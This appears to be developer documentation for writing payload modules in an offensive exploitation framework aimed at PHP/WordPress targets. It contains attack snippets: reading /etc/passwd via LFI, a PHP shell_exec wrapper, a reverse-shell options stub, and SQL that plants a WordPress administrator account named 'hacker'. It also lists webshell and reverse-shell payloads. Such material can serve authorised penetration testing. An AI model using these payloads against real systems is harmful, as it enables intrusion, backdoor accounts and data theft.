# Creating Payloads

A payload generates instructions that an exploit delivers to the target.
You write the "what" (read a file, spawn a shell, deploy a webshell).
The exploit handles the "how" (SQL injection, RCE, file upload).

## File Structure

```
payloads/{name}/main.py
```

Examples:
- `payloads/revshell/main.py`
- `payloads/webshell/main.py`
- `payloads/filebrowser/main.py`

## Minimal Payload

```python
from hwp import Payload

class MyPayload(Payload):
    name = "My Payload"
    methods = ["RCE"]

    def instructions(self, method):
        return ["<?php echo 'hello'; ?>"]

    def report(self, results):
        for r in results:
            if r.success:
                self.success(f"Output: {r.output}")
```

## Required Class Properties

| Property | Type | Description |
|----------|------|-------------|
| `name` | str | Human-readable name |
| `methods` | list | Capabilities this payload works with (e.g. `["RCE", "RCEs"]`) |

## Optional Class Properties

| Property | Type | Default | Description |
|----------|------|---------|-------------|
| `description` | str | `""` | Short one-line description |
| `authors` | list | `[]` | Payload authors |
| `credits` | list | `[]` | Special thanks |
| `options` | list | `[]` | Configurable options (see below) |

## Methods

### `instructions(self, method)`

Called by the framework before execution. Returns a list of instruction strings.
The `method` parameter tells you which capability was matched (e.g. `"RCE"`, `"LFI"`).

```python
def instructions(self, method):
    filepath = self.options.get("file", "/etc/passwd")

    if method == "LFI":
        return [filepath]
    elif method == "RCEs":
        return [f"cat {filepath}"]
```

Return a list even for a single instruction. Each instruction is delivered
to the target separately, and the Result from each is collected.

### `report(self, results)`

Called after all instructions have been executed. Receives a list of Result objects.
This is where you tell the user what happened.

```python
def report(self, results):
    for r in results:
        if r.success and r.output:
            self.success("File contents:")
            print(r.output)
        else:
            self.error("Failed to read file")
```

## Options

Declare options so they appear in the interactive TUI and can be passed via CLI.

```python
class RevShell(Payload):
    name = "Reverse Shell"
    methods = ["RCE", "RCEs"]
    options = [
        {"name": "lhost", "default": "", "help": "Listener IP (required)"},
        {"name": "lport", "default": "4444", "help": "Listener port"},
    ]

    def instructions(self, method):
        lhost = self.options.get("lhost", "")
        lport = self.options.get("lport", "4444")

        if not lhost:
            self.error("LHOST is required")
            return []

        # ...
```

Options are accessed via `self.options.get("name")`. In CLI mode they're passed
as `--lhost`, `--lport`, etc. In interactive mode they appear as input fields.

## Output

All payload output is always visible (not gated by verbose):

```python
self.info("Deploying webshell...")     # Always shows
self.success("Shell deployed!")        # Always shows
self.error("Deployment failed")        # Always shows
self.warn("Non-standard response")    # Always shows
```

This is different from exploits where `info` and `success` are verbose-only.
The reasoning: the payload is what the user chose to run, so its output is
what the user cares about.

## Result Object

The Result object from each exploit execution has these fields:

| Field | Type | Description |
|-------|------|-------------|
| `success` | bool | Did the exploit succeed? |
| `output` | str | Raw response / command output |
| `path` | str | Filesystem path on target |
| `url` | str | Remote URL (uploaded file, etc.) |
| `session` | dict | Session cookies |
| `credentials` | dict | `{"username": ..., "password": ..., "role": ...}` |
| `message` | str | Human-readable status |
| `rows_affected` | int | SQL rows affected |
| `insert_id` | int | SQL insert ID |

Access fields directly: `result.output`, `result.url`, etc.
Missing fields are `None`.

## Instruction Chaining with Placeholders

When sending multiple instructions, use `{prev.X}` to reference the previous Result:

```python
def instructions(self, method):
    return [
        "INSERT INTO wp_users SET user_login='hacker', user_pass=MD5('pass');",
        "INSERT INTO wp_usermeta SET user_id={prev.insert_id}, meta_key='wp_capabilities', meta_value='a:1:{{s:13:\"administrator\";b:1;}}';",
    ]
```

Available: `{prev.output}`, `{prev.insert_id}`, `{prev.rows_affected}`,
`{prev.url}`, `{prev.path}`, `{prev.message}`

## Supporting Multiple Methods

A payload can work with different capabilities. Use the `method` parameter
to generate the right instruction:

```python
class Bash(Payload):
    name = "Bash Command"
    methods = ["RCE", "RCEs"]

    def instructions(self, method):
        cmd = self.options.get("cmd", "")

        if method == "RCE":
            # Wrap in PHP for RCE capability
            safe = cmd.replace("'", "'\\''")
            return [f"<?php echo shell_exec('{safe}'); ?>"]
        elif method == "RCEs":
            # Direct shell command
            return [cmd]
```

## Available Payloads

| Payload | Methods | Description |
|---------|---------|-------------|
| `admin_user` | RCE, SQLi | Create a WordPress admin account |
| `bash` | RCE, RCEs | Execute shell commands |
| `file_read` | LFI, RCEs | Read a file from the target |
| `filebrowser` | RCE | Deploy web-based file manager |
| `php` | RCE | Execute arbitrary PHP code |
| `revshell` | RCE, RCEs | Spawn a reverse shell |
| `webshell` | RCE | Deploy browser-based web shell |

## Template

Copy `payloads/template/main.py` as a starting point.
